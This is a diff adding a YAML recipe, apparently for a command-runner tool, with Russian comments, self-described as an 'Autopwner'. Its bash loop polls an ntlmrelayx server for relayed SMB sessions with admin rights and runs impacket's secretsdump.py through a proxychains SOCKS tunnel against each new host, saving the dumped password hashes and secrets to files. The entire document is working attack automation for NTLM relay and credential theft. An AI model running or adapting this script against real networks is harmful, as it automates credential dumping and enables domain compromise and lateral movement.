@@ -1,0 +1,57 @@
+description: |-
+  Опрашивает ntlmrelayx серевер и запускает secretsdump, когда появляется новая админская сессия
+
+  Запускать в подготовленной директории!
+  Будет сохранять файлы
+author: vinzekatze
+tags:
+  - automation
+  - secretsdump
+  - smb
+  - ntlm
+
+install: |-
+  sudo apt install proxychains4
+  pipx install impacket
+
+arguments:
+  s:
+    default:
+      - '127.0.0.1'
+    metavar: IP
+    replacer: __SERVER__
+    description: ip-адресс ntlmrelayx сервера
+  d:
+    default:
+      - 5
+    metavar: SECONDS
+    replacer: __DELAY__
+    regex: '\d+'
+    description: задержка опроса ntlmrelayx сервевра
+
+mode:
+  format:
+    s: '{!r}'
+    d: '{!r}'
+
+shell: bash
+script: >-
+  ntlmrelayx_server=__SERVER__;
+  prx_config_file='ntlmrelayx_prx.config';
+  echo -e "# Proxychains conf for relay-attc\nstrict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n#\n[ProxyList]\nsocks4        $ntlmrelayx_server 1080" > $prx_config_file;
+  prx_config_file_path=$(realpath $prx_config_file);
+  checked_relayes="";
+  echo "Autopwner started";
+  echo;
+  while true; do
+  adminrelx=$(curl -kls http://$ntlmrelayx_server:9090/ntlmrelayx/api/v1.0/relays | jq -r '.[] | select(.[3]=="TRUE" and .[0]=="SMB")');
+  for prx in $(echo $adminrelx | jq -r '.[2]+"@"+ .[1]'); do 
+  host_ip=${prx#*@};
+  if ! (ls | grep $host_ip. -q) && ! (echo $checked_relayes | grep -w -q $prx); then
+  date -Ins; 
+  proxychains4 -f $prx_config_file_path secretsdump.py -outputfile $host_ip $prx -no-pass; checked_relayes="$checked_relayes $prx";
+  echo;
+  fi;
+  done;
+  sleep __DELAY__;
+  done
